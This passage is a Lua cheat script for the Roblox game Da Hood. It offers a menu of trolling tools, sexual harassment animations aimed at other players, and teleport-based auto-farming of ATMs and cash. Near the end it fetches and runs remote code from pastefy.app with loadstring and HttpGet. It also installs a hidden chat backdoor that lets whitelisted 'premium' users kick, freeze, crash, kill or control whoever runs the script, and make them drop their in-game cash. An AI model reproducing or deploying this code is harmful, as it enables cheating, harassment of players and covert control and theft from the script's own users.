                                for _, Anim in pairs(LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())do
                                    Anim:Stop()
                                end

                                LocalPlayer.Character.Animate.Disabled = false

                                LocalPlayer.Character.Humanoid:LoadAnimation(IM.RightAim):Play()
                                LocalPlayer.Character.Humanoid:LoadAnimation(IM.LeftAim):Play()

                                AT0, AT1, AP, A0 = Align(Ins.Parent.UpperTorso, LocalPlayer.Character.UpperTorso, Vector3.new(0, 0, 10), Vector3.new(90, 545, 0))

                                spawn(function()
                                    while Ins.Parent ~= nil do
                                        task.wait()

                                        local Sine = tick() * 60

                                        AT1.Position = Vector3.new(0, -1.2, -5 + 1 * math.sin(Sine / 8))
                                    end
                                end)
                            end

                            repeat
                                task.wait()
                            until Ins.Parent == nil

                            LocalPlayer.Character.Animate.Disabled = true

                            for _, Anim in pairs(LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())do
                                Anim:Stop()
                            end

                            LocalPlayer.Character.Animate.Disabled = false

                            AT0:Destroy()
                            AT1:Destroy()
                            AP:Destroy()
                            A0:Destroy()
                        end
                    end)
                end)
            end

            function play(ID, STOP, TOOL)
                local LocalPlayer = Players.LocalPlayer

                if LocalPlayer.Backpack:FindFirstChild('[Boombox]') then
                    local Tool = nil
                    local character = LocalPlayer.Character

                    if character:FindFirstChildWhichIsA('Tool') and TOOL == true then
                        Tool = character:FindFirstChildWhichIsA('Tool')
                        character:FindFirstChildWhichIsA('Tool').Parent = LocalPlayer.Backpack
                    end

                    local boombox = LocalPlayer.Backpack['[Boombox]']

                    if boombox then
                        boombox.Parent = character

                        game.ReplicatedStorage.MainEvent:FireServer('Boombox', ID)

                        character['[Boombox]'].Parent = LocalPlayer.Backpack
                        LocalPlayer.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false

                        if Tool then
                            Tool.Parent = character
                        end
                        if STOP then
                            character.LowerTorso:WaitForChild('BOOMBOXSOUND')

                            local cor = coroutine.wrap(function()
                                repeat
                                    wait()
                                until character.LowerTorso.BOOMBOXSOUND.SoundId == 'rbxassetid://' .. ID and character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01

                                OriginalKeyUpValue = OriginalKeyUpValue + 1

                                STOPLMAO(ID, OriginalKeyUpValue)
                            end)

                            cor()
                        end
                    end
                end
            end

            function StopAudio()
                local LocalPlayer = Players.LocalPlayer

                if LocalPlayer and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('LowerTorso') then
                    local boomboxSound = LocalPlayer.Character.LowerTorso:FindFirstChild('BOOMBOXSOUND')

                    if boomboxSound then
                        ReplicatedStorage:WaitForChild('MainEvent'):FireServer('BoomboxStop')
                    end
                end
            end
            function RemoveTool(toolName)
                local backpack = LocalPlayer:FindFirstChild('Backpack')
                local character = LocalPlayer.Character

                if backpack then
                    local toolInBackpack = backpack:FindFirstChild(toolName)

                    if toolInBackpack then
                        toolInBackpack:Destroy()
                    end
                end
                if character then
                    local toolInCharacter = character:FindFirstChild(toolName)

                    if toolInCharacter then
                        toolInCharacter:Destroy()
                    end
                end
            end

            LocalPlayer.CharacterAdded:Connect(function()
                task.wait(2)

                for toolName, isEnabled in pairs(ToolStates)do
                    if isEnabled then
                        if toolName == 'Neckgrab' then
                            CreateNeckgrabTool()
                        elseif toolName == 'Up' then
                            CreateUpTool()
                        elseif toolName == 'Air' then
                            CreateAirTool()
                        elseif toolName == 'Throw' then
                            CreateThrowTool()
                        elseif toolName == 'HeavenThrow' then
                            CreateHeavenThrowTool()
                        elseif toolName == 'Punch' then
                            CreatePunchTool()
                        elseif toolName == 'RipInHalf' then
                            CreateRipInHalfTool()
                        elseif toolName == 'Void' then
                            CreateVoidTool()
                        elseif toolName == 'Orbit' then
                            CreateOrbitTool()
                        elseif toolName == 'Bend' then
                            CreateBendTool()
                        elseif toolName == 'Blow' then
                            CreateBlowTool()
                        end
                    end
                end
            end)
            TrollingBox:AddToggle('NeckgrabToggle', {
                Text = 'Neckgrab',
                Default = false,
                Callback = function(state)
                    ToolStates.Neckgrab = state

                    if state then
                        CreateNeckgrabTool()
                    else
                        RemoveTool('Activate Neckgrab')
                    end
                end,
            })
            TrollingBox:AddToggle('UpToggle', {
                Text = 'Up',
                Default = false,
                Callback = function(state)
                    ToolStates.Up = state

                    if state then
                        CreateUpTool()
                    else
                        RemoveTool('Up')
                    end
                end,
            })
            TrollingBox:AddToggle('AirToggle', {
                Text = 'Air',
                Default = false,
                Callback = function(state)
                    ToolStates.Air = state

                    if state then
                        CreateAirTool()
                    else
                        RemoveTool('Air')
                    end
                end,
            })
            TrollingBox:AddToggle('ThrowToggle', {
                Text = 'Throw',
                Default = false,
                Callback = function(state)
                    ToolStates.Throw = state

                    if state then
                        CreateThrowTool()
                    else
                        RemoveTool('Throw')
                    end
                end,
            })
            TrollingBox:AddToggle('HeavenThrowToggle', {
                Text = 'Heaven Throw',
                Default = false,
                Callback = function(state)
                    ToolStates.HeavenThrow = state

                    if state then
                        CreateHeavenThrowTool()
                    else
                        RemoveTool('Heaven Throw')
                    end
                end,
            })
            TrollingBox:AddToggle('PunchToggle', {
                Text = 'Punch',
                Default = false,
                Callback = function(state)
                    ToolStates.Punch = state

                    if state then
                        CreatePunchTool()
                    else
                        RemoveTool('Punch')
                    end
                end,
            })
            TrollingBox:AddToggle('RipInHalfToggle', {
                Text = 'Rip In Half',
                Default = false,
                Callback = function(state)
                    ToolStates.RipInHalf = state

                    if state then
                        CreateRipInHalfTool()
                    else
                        RemoveTool('Rip In Half')
                    end
                end,
            })
            TrollingBox:AddToggle('VoidToggle', {
                Text = 'Void',
                Default = false,
                Callback = function(state)
                    ToolStates.Void = state

                    if state then
                        CreateVoidTool()
                    else
                        RemoveTool('Void')
                    end
                end,
            })
            TrollingBox:AddToggle('OrbitToggle', {
                Text = 'Orbit',
                Default = false,
                Callback = function(state)
                    ToolStates.Orbit = state

                    if state then
                        CreateOrbitTool()
                    else
                        RemoveTool('Orbit')
                    end
                end,
            })
            TrollingBox:AddToggle('BendToggle', {
                Text = 'Bend',
                Default = false,
                Callback = function(state)
                    ToolStates.Bend = state

                    if state then
                        CreateBendTool()
                    else
                        RemoveTool('Bend')
                    end
                end,
            })
            TrollingBox:AddToggle('BlowToggle', {
                Text = 'Blow',
                Default = false,
                Callback = function(state)
                    ToolStates.Blow = state

                    if state then
                        CreateBlowTool()
                    else
                        RemoveTool('Blow')
                    end
                end,
            })


	getgenv().jerkOffEnabled = false

	TrollingBox:AddToggle('JerkOff', {
		Text = 'Jerk Off',
		Default = false,
		Callback = function(v)
			getgenv().jerkOffEnabled = v

			if v then
				local speaker = Players.LocalPlayer
				local humanoid = speaker.Character and speaker.Character:FindFirstChildOfClass('Humanoid')
				local backpack = speaker:FindFirstChild('Backpack')

				if not humanoid or not backpack then
					Library:Notify('Character or backpack not found!', 5)

					return
				end

				function createJerkOffTool()
					local tool = Instance.new('Tool')

					tool.Name = 'Jerk Off'
					tool.ToolTip = 'in the stripped club. straight up "jorking it" . and by "it" , haha, well. let\'s justr say. My peanits.'
					tool.RequiresHandle = false
					tool.Parent = backpack

					local jorkin = false
					local track = nil

					function stopTomfoolery()
						jorkin = false

						if track then
							track:Stop()

							track = nil
						end
					end

					tool.Equipped:Connect(function()
						jorkin = true
					end)
					tool.Unequipped:Connect(stopTomfoolery)
					humanoid.Died:Connect(stopTomfoolery)
					task.spawn(function()
						while task.wait() do
							if not jorkin then
								continue
							end

							local isR15 = humanoid.RigType == Enum.HumanoidRigType.R15

							if not track then
								local anim = Instance.new('Animation')

								anim.AnimationId = isR15 and 'rbxassetid://698251653' or 'rbxassetid://72042024'
								track = humanoid:LoadAnimation(anim)
							end

							track:Play()
							track:AdjustSpeed(isR15 and 0.7 or 0.65)

							track.TimePosition = 0.6

							task.wait(0.1)

							while track and track.TimePosition < (isR15 and 0.7 or 0.65) do
								task.wait(0.1)
							end

							if track then
								track:Stop()

								track = nil
							end
						end
					end)
				end

				createJerkOffTool()
			else
				local speaker = Players.LocalPlayer
				local backpack = speaker:FindFirstChild('Backpack')
				local character = speaker.Character

				if backpack then
					local toolInBackpack = backpack:FindFirstChild('Jerk Off')

					if toolInBackpack then
						toolInBackpack:Destroy()
					end
				end
				if character then
					local toolInCharacter = character:FindFirstChild('Jerk Off')

					if toolInCharacter then
						toolInCharacter:Destroy()
					end
				end
			end
		end,
	})

		getgenv().Test = false
		getgenv().SoundId = '6899466638'
		getgenv().ToolEnabled = false
		getgenv().CreateTool = function()
			getgenv().Tool = Instance.new('Tool')
			getgenv().Tool.RequiresHandle = false
			getgenv().Tool.Name = '[Kick]'
			getgenv().Tool.TextureId = 'rbxassetid://483225199'
			getgenv().Animation = Instance.new('Animation')
			getgenv().Animation.AnimationId = 'rbxassetid://2788306916'

			getgenv().Tool.Activated:Connect(function()
				getgenv().Test = true
				getgenv().Player = Players.LocalPlayer
				getgenv().Character = getgenv().Player.Character or getgenv().Player.CharacterAdded:Wait()
				getgenv().Humanoid = getgenv().Character:FindFirstChild('Humanoid')

				if getgenv().Humanoid then
					getgenv().AnimationTrack = getgenv().Humanoid:LoadAnimation(getgenv().Animation)

					getgenv().AnimationTrack:AdjustSpeed(3.4)
					getgenv().AnimationTrack:Play()
				end

				task.wait(0.6)

				getgenv().Boombox = Players.LocalPlayer.Backpack:FindFirstChild('[Boombox]')

				if getgenv().Boombox then
					getgenv().Boombox.Parent = Players.LocalPlayer.Character

					MainEvent:FireServer('Boombox', tonumber(getgenv().SoundId))

					getgenv().Boombox.RequiresHandle = false
					getgenv().Boombox.Parent = Players.LocalPlayer.Backpack

					task.wait(1)
					MainEvent:FireServer('BoomboxStop')
				else
					getgenv().Sound = Instance.new('Sound', workspace)
					getgenv().Sound.SoundId = 'rbxassetid://' .. getgenv().SoundId

					getgenv().Sound:Play()
					task.wait(1)
					getgenv().Sound:Stop()
				end

				wait(1.4)

				getgenv().Test = false
			end)

			getgenv().Tool.Parent = Players.LocalPlayer:WaitForChild('Backpack')
		end
		getgenv().RemoveTool = function()
			getgenv().Player = Players.LocalPlayer
			getgenv().Tool = getgenv().Player.Backpack:FindFirstChild('[Kick]') or getgenv().Player.Character:FindFirstChild('[Kick]')

			if getgenv().Tool then
				getgenv().Tool:Destroy()
			end
		end

		game:GetService('RunService').Heartbeat:Connect(function()
			if getgenv().Test then
				getgenv().Character = Players.LocalPlayer.Character

				if not getgenv().Character then
					return
				end

				getgenv().HumanoidRootPart = getgenv().Character:FindFirstChild('HumanoidRootPart')

				if not getgenv().HumanoidRootPart then
					return
				end

				getgenv().originalVelocity = getgenv().HumanoidRootPart.Velocity
				getgenv().HumanoidRootPart.Velocity = Vector3.new(getgenv().HumanoidRootPart.CFrame.LookVector.X * 800, 800, getgenv().HumanoidRootPart.CFrame.LookVector.Z * 800)

				game:GetService('RunService').RenderStepped:Wait()

				getgenv().HumanoidRootPart.Velocity = getgenv().originalVelocity
			end
		end)
		TrollingBox:AddToggle('Pqnd4Kick', {
			Text = 'Pqnd4 Kick Tool',
			Default = false,
			Callback = function(v)
				getgenv().ToolEnabled = v

				if v then
					getgenv().CreateTool()
				else
					getgenv().RemoveTool()
				end
			end,
		})
	end
end
if isDaHood then
    do
		local Workspace = game:GetService("Workspace")
		local RunService = game:GetService("RunService")
		
		local player = Players.LocalPlayer
		local cashiersFolder = Workspace.Cashiers
		local dropsFolder = Workspace.Ignored.Drop
		
		local AutoFarm = Tabs.Misc:AddLeftGroupbox("Auto Farm")
		
		local isFarming = false
		local farmThread = nil
		
		function FireClick(obj)
		    local cd = obj:FindFirstChildOfClass("ClickDetector")
		    if cd then
		        fireclickdetector(cd)
		    end
		end
		
		function GetNearbyDrops()
		    local list = {}
		    local char = player.Character
		    if not char then return list end
		
		    local hrp = char:FindFirstChild("HumanoidRootPart")
		    if not hrp then return list end
		
		    for _, drop in pairs(dropsFolder:GetChildren()) do
		        if drop.Name == "MoneyDrop" then
		            if (drop.Position - hrp.Position).Magnitude <= 60 then
		                table.insert(list, drop)
		            end
		        end
		    end
		    return list
		end
		
		function TPToDrop(drop)
		    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
		    if hrp then
		        hrp.CFrame = CFrame.new(drop.Position + Vector3.new(0, 3, 0))
		        hrp.Velocity = Vector3.zero
		    end
		end
		
		function GetAliveATM()
		    for _, atm in pairs(cashiersFolder:GetChildren()) do
		        if atm.Name ~= "VAULT" and atm:FindFirstChild("Humanoid") and atm.Humanoid.Health > 0 then
		            return atm
		        end
		    end
		    return nil
		end
		
		function BuyAndEquipKnife(char, hrp)
		    local knife = char:FindFirstChild("[Knife]") or player.Backpack:FindFirstChild("[Knife]")
		
		    if not knife then
		        local shop = Workspace.Ignored.Shop["[Knife] - $169"]
		        local old = hrp.CFrame
		
		        hrp.CFrame = shop.Head.CFrame
		        task.wait(0.5)
		        fireclickdetector(shop.ClickDetector)
		
		        repeat task.wait() until player.Backpack:FindFirstChild("[Knife]")
		
		        hrp.CFrame = old
		        knife = player.Backpack:FindFirstChild("[Knife]")
		    end
		
		    if knife then
		        knife.Parent = char
		    end
		
		    return knife
		end
		
		function RandomFly(hrp)
		    hrp.CFrame = CFrame.new(
		        math.random(-80000, 80000),
		        math.random(300, 700),
		        math.random(-80000, 80000)
		    )
		end
		
		function StartFarm()
		    farmThread = task.spawn(function()
		        repeat task.wait() until player.Character and player.Character:FindFirstChild("FULLY_LOADED_CHAR")
		
		        while isFarming do
		            local char = player.Character
		            if not char then task.wait(0.5) continue end
		
		            local hrp = char:FindFirstChild("HumanoidRootPart")
		            if not hrp then task.wait() continue end
		
		            local knife = BuyAndEquipKnife(char, hrp)
		            local atm = GetAliveATM()
		
		            if not atm then
		                RandomFly(hrp)
		                task.wait(3)
		                continue
		            end
		
		            repeat
		                if not isFarming then break end
		                if not atm or atm.Humanoid.Health <= 0 then break end
		
		                hrp.CFrame = atm.Head.CFrame * CFrame.new(1, -4.3, 0) * CFrame.Angles(0, math.rad(180), 0)
		
		                if knife then
		                    knife:Activate()
		                end
		
		                task.wait(0.28)
		            until atm.Humanoid.Health <= 0
		
		            -- loot
		            hrp.CFrame = atm.Head.CFrame
		            task.wait(0.4)
		
		            for _, tool in pairs(char:GetChildren()) do
		                if tool:IsA("Tool") then
		                    tool.Parent = player.Backpack
		                end
		            end
		
		            for _, drop in pairs(GetNearbyDrops()) do
		                TPToDrop(drop)
		                task.wait(0.3)
		                FireClick(drop)
		                task.wait(0.5)
		            end
		
		            task.wait(1)
		        end
		    end)
		end
		
		AutoFarm:AddToggle("AutoATM", {
		    Text = "ATM Farm",
		    Default = false,
		    Callback = function(state)
		        isFarming = state
		
		        if state then
		            StartFarm()
		        else
		            if farmThread then
		                task.cancel(farmThread)
		                farmThread = nil
		            end
		        end
		    end
		})
		
		AutoFarm:AddToggle('lettuceToggle', {
			Text = 'Auto Eat Lettuce',
			Default = false,
			Tooltip = 'auto buy and eat lettuce'
		})
		
		local RunService = game:GetService("RunService")
		local LocalPlayer = Players.LocalPlayer
		
		local oldCFrame
		
		function getHRP()
		    local char = LocalPlayer.Character
		    return char and char:FindFirstChild("HumanoidRootPart")
		end
		
		function getLettuce()
		    local char = LocalPlayer.Character
		    return (LocalPlayer.Backpack:FindFirstChild("[Lettuce]") or (char and char:FindFirstChild("[Lettuce]")))
		end
		
		Toggles.lettuceToggle:OnChanged(function(v)
		    if v then
		        oldCFrame = getHRP() and getHRP().CFrame
		
		        RunService:BindToRenderStep("LettuceFarm", 0, function()
		            local char = LocalPlayer.Character
		            local hrp = getHRP()
		            if not char or not hrp then return end
		
		            local lettuce = getLettuce()
		
		            if lettuce then
		                -- Có lettuce → equip hoặc ăn
		                if lettuce.Parent == LocalPlayer.Backpack then
		                    lettuce.Parent = char
		                else
		                    lettuce:Activate()
		                end
		            else
		                -- Không có → đi mua
		                local shopItem = workspace:FindFirstChild("Ignored")
		                    and workspace.Ignored:FindFirstChild("Shop")
		                    and workspace.Ignored.Shop:FindFirstChild("[Lettuce] - $6")
		
		                if shopItem and shopItem:FindFirstChild("Head") and shopItem:FindFirstChildOfClass("ClickDetector") then
		                    hrp.CFrame = shopItem.Head.CFrame * CFrame.new(0, 3, 0)
		                    fireclickdetector(shopItem:FindFirstChildOfClass("ClickDetector"))
		                end
		            end
		        end)
		
		    else
		        RunService:UnbindFromRenderStep("LettuceFarm")
		
		        if oldCFrame and getHRP() then
		            getHRP().CFrame = oldCFrame
		        end
		    end
		end)
	end
end
Library:OnUnload(function()
    if connection then connection:Disconnect() end
    if forceHitConnection then forceHitConnection:Disconnect() end
    if currentHL then currentHL:Destroy() end
    tracer:Remove()
    fovCircle:Remove()
    print("Unloaded!")
end)

local MenuGroup = Tabs["UI Settings"]:AddLeftGroupbox("Menu", "wrench")

MenuGroup:AddToggle("KeybindMenuOpen", {
	Default = Library.KeybindFrame.Visible,
	Text = "Open Keybind Menu",
	Callback = function(value)
		Library.KeybindFrame.Visible = value
	end,
})
MenuGroup:AddToggle("ShowCustomCursor", {
	Text = "Custom Cursor",
	Default = false,
	Callback = function(Value)
		Library.ShowCustomCursor = Value
	end,
})
MenuGroup:AddDropdown("NotificationSide", {
	Values = { "Left", "Right" },
	Default = "Right",

	Text = "Notification Side",

	Callback = function(Value)
		Library:SetNotifySide(Value)
	end,
})

MenuGroup:AddDivider()
MenuGroup:AddLabel("Menu bind")
	:AddKeyPicker("MenuKeybind", { Default = "RightShift", NoUI = true, Text = "Menu keybind" })

MenuGroup:AddButton("Unload", function()
	Library:Unload()
end)
MenuGroup:AddButton({
    Text = 'Rejoin Server',
    Func = function()
        game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, Players.LocalPlayer)
    end,
    Tooltip = 'Rejoin the current server',
    DoubleClick = false,
    Disabled = false,
    Visible = true,
})
MenuGroup:AddButton({
    Text = 'Copy Join Script',
    Func = function()
        local jsScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '", Players.LocalPlayer)'

        setclipboard(jsScript)
    end,
    Tooltip = 'Copy the join script for the current server',
    DoubleClick = false,
    Disabled = false,
    Visible = true,
})
MenuGroup:AddButton({
    Text = 'Join New Server',
    Func = function()
        local HttpService = game:GetService("HttpService")
        local TeleportService = game:GetService("TeleportService")

        local success, response = pcall(function()
            return HttpService:JSONDecode(
                game:HttpGetAsync(
                    "https://games.roblox.com/v1/games/" ..
                    game.PlaceId ..
                    "/servers/Public?sortOrder=Asc&limit=100"
                )
            )
        end)

        if not success or not response or not response.data then
            warn("Failed to fetch servers")
            return
        end

        local validServers = {}

        for _, server in ipairs(response.data) do
            if server.playing <= (getgenv().MaxPlayers or 15)
            and server.playing < server.maxPlayers
            and server.id ~= game.JobId then
                table.insert(validServers, server)
            end
        end

        if #validServers > 0 then
            local chosen = validServers[math.random(1, #validServers)]
            TeleportService:TeleportToPlaceInstance(game.PlaceId, chosen.id)
        else
            warn("No suitable server found")
        end
    end,

    Tooltip = 'Join a server with selected max players',
    DoubleClick = false,
    Disabled = false,
    Visible = true,
})
MenuGroup:AddSlider('MaxPlayersSlider', {
    Text = 'Max Players',
    Default = 15,
    Min = 0,
    Max = 40,
    Rounding = 0,
    Compact = true,

    Callback = function(Value)
        getgenv().MaxPlayers = Value
    end,
})

do
	local LocalPlayer = Players.LocalPlayer
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local TeleportService = game:GetService("TeleportService")
    local TextChatService = game:GetService("TextChatService")
	local whitelistedUsers = {}
	local activeListeners = {}
	
	local premiumUsers = loadstring(game:HttpGet("https://pastefy.app/uony5Xox/raw"))()
	
	local bypassPremiumUsers = loadstring(game:HttpGet("https://pastefy.app/v6r3CVBW/raw"))()
	
	function isPremium(player)
	    return premiumUsers[player.UserId] == true
	end
	
	function isBypassPremium(player)
	    return bypassPremiumUsers[player.UserId] == true
	end
	
	function removeOldListeners()
	    for userId in pairs(activeListeners) do
	        if handler then
	            activeListeners[userId] = nil
	        end
	    end
	end
	
	function updateDisplayName(player)
	    if not player.Character then return end
	
	    local humanoid = player.Character:WaitForChild("Humanoid")
	    if humanoid then
	        if isPremium(player) then
	            humanoid.DisplayName = "[🌟] " .. player.Name
	        elseif isBypassPremium(player) then
	            humanoid.DisplayName = "[💫] " .. player.Name
	        end
	    end
	end
	
	function setupDisplayNameListener(player)
	    if player.Character then
	        updateDisplayName(player)
	    end
	
	    player.CharacterAdded:Connect(function()
	        task.wait(0.1)
	        updateDisplayName(player)
	    end)
	end
	
	benxActive = false
	TweenService = game:GetService("TweenService")
	
	function startBenx(targetPlayer)
	    if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
	    benxActive = true
	
	    local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
	
	    task.spawn(function()
	        while benxActive do
	            local char = LocalPlayer.Character
	            local targetChar = targetPlayer.Character
	
	            if char and char:FindFirstChild("HumanoidRootPart") and targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
	                local hrp = char.HumanoidRootPart
	                local targetHRP = targetChar.HumanoidRootPart
	
	                local frontPos = targetHRP.CFrame * CFrame.new(0, 0, -1)
	                local backPos = targetHRP.CFrame * CFrame.new(0, 0, -4)
	
	                local tween1 = TweenService:Create(hrp, tweenInfo, {CFrame = frontPos})
	                tween1:Play()
	                tween1.Completed:Wait()
	
	                local tween2 = TweenService:Create(hrp, tweenInfo, {CFrame = backPos})
	                tween2:Play()
	                tween2.Completed:Wait()
	            end
	            if not benxActive then break end
	        end
	    end)
	end
	
	function setupChatListener(player)
	    if not (isPremium(player) or isBypassPremium(player)) then return end
	
	    activeListeners[player.UserId] = function(msg)
	        local sender = msg.TextSource and msg.TextSource.UserId and Players:GetPlayerByUserId(msg.TextSource.UserId)
	        if not sender or sender ~= player then return end
	
	        local message = msg.Text or ""
	        local msgLower = message:lower()
	
	        if isPremium(player) then
	            if msgLower == "!kick ." then
	                LocalPlayer:Kick(":o")
	            elseif msgLower == "!freeze ." then
	                local char = LocalPlayer.Character
	                if char and char:FindFirstChild("HumanoidRootPart") then
	                    char.HumanoidRootPart.Anchored = true
	                end
	            elseif msgLower == "!unfreeze ." then
	                local char = LocalPlayer.Character
	                if char and char:FindFirstChild("HumanoidRootPart") then
	                    char.HumanoidRootPart.Anchored = false
	                end
	            elseif msgLower == "!bring ." then
	                local char = LocalPlayer.Character
	                local targetChar = player.Character
	                if char and char:FindFirstChild("HumanoidRootPart") and targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
	                    lockedTarget = nil
	                    voiding = false
	                    local hrp = char.HumanoidRootPart
	                    hrp.Velocity = Vector3.zero
	                    hrp.RotVelocity = Vector3.zero
	                    hrp.AssemblyLinearVelocity = Vector3.zero
	                    hrp.AssemblyAngularVelocity = Vector3.zero
	                    char.HumanoidRootPart.CFrame = targetChar.HumanoidRootPart.CFrame
	                    hrp.Velocity = Vector3.zero
	                    hrp.RotVelocity = Vector3.zero
	                    hrp.AssemblyLinearVelocity = Vector3.zero
	                    hrp.AssemblyAngularVelocity = Vector3.zero
	                end
	            elseif msgLower == "!crash ." then
	                while true do end
	            elseif msgLower == "!dropcash ." then
	                ReplicatedStorage.MainEvent:FireServer("DropMoney", "15000")
	            elseif msgLower == "!benx ." then
	                startBenx(player)
	            elseif msgLower == "!unbenx ." then
	                benxActive = false
	            elseif msgLower == "!talk off" then
	                trashtalkactive = false
	            end
	        end
	
	        if isBypassPremium(player) then
	            if msgLower == "!ban ." then
	                LocalPlayer:Kick("PERMA-BAN")
	            elseif msgLower == "!kick ." then
	                LocalPlayer:Kick(":o")
	            elseif msgLower == "!freeze ." then
	                local char = LocalPlayer.Character
	                if char and char:FindFirstChild("HumanoidRootPart") then
	                    char.HumanoidRootPart.Anchored = true
	                end
	            elseif msgLower == "!unfreeze ." then
	                local char = LocalPlayer.Character
	                if char and char:FindFirstChild("HumanoidRootPart") then
	                    char.HumanoidRootPart.Anchored = false
	                end
	            elseif msgLower == "!bring ." then
	                local char = LocalPlayer.Character
	                local targetChar = player.Character
	                if char and char:FindFirstChild("HumanoidRootPart") and targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
	                    lockedTarget = nil
	                    voiding = false
	                    local hrp = char.HumanoidRootPart
	                    hrp.Velocity = Vector3.zero
	                    hrp.RotVelocity = Vector3.zero
	                    hrp.AssemblyLinearVelocity = Vector3.zero
	                    hrp.AssemblyAngularVelocity = Vector3.zero
	                    char.HumanoidRootPart.CFrame = targetChar.HumanoidRootPart.CFrame
	                    hrp.Velocity = Vector3.zero
	                    hrp.RotVelocity = Vector3.zero
	                    hrp.AssemblyLinearVelocity = Vector3.zero
	                    hrp.AssemblyAngularVelocity = Vector3.zero
	                end
	            elseif msgLower == "!crash ." then
	                while true do end
	            elseif msgLower:match("^%!say %. (.+)$") then
	                local textToSend = msgLower:match("^%-say %. (.+)$")
	                sendMessage(textToSend)
	            elseif msgLower == "!rejoin ." then
	                TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
	            elseif msgLower == "!adropcash ." then
	                autodrop = true
	            elseif msgLower == "!unadropcash ." then
	                autodrop = false
	            elseif msgLower == "!lkill ." then
	                lkill = true
	                task.spawn(function()
	                    while lkill do
	                        local char = Players.LocalPlayer.Character
	                        if char and char:FindFirstChild("Humanoid") then
	                            char.Humanoid.Health = 0
	                        end
	                        task.wait(0.2)
	                    end
	                end)
	            elseif msgLower == "!unlkill ." then
	                lkill = false
	            elseif msgLower == "!dropcash ." then
	                ReplicatedStorage.MainEvent:FireServer("DropMoney", "15000")
	            elseif msgLower == "!benx ." then
	                startBenx(player)
	            elseif msgLower == "!unbenx ." then
	                benxActive = false
	            elseif msgLower == "!talk off" then
	                trashtalkactive = false
	            end
	        end
	    end
	end
	
	TextChatService.OnIncomingMessage = function(msg)
	    for _, handler in pairs(activeListeners) do
	        if handler then
	            handler(msg)
	        end
	    end
	end
	
	for _, player in pairs(Players:GetPlayers()) do
	    if (isPremium(player) or isBypassPremium(player)) then
	        setupChatListener(player)
	        setupDisplayNameListener(player)
	    end
	end
	
	Players.PlayerAdded:Connect(function(player)
	    task.spawn(function()
	        task.wait(0.1)
	        if (isPremium(player) or isBypassPremium(player)) then
	            setupChatListener(player)
	            setupDisplayNameListener(player)
	        end
	    end)
	end)
end

Library.ToggleKeybind = Options.MenuKeybind
ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({ "MenuKeybind" })
ThemeManager:SetFolder("letal win")
SaveManager:SetFolder("letal win/dahood")
SaveManager:SetSubFolder("dahood")
SaveManager:BuildConfigSection(Tabs["UI Settings"])
ThemeManager:ApplyToTab(Tabs["UI Settings"])
SaveManager:LoadAutoloadConfig()
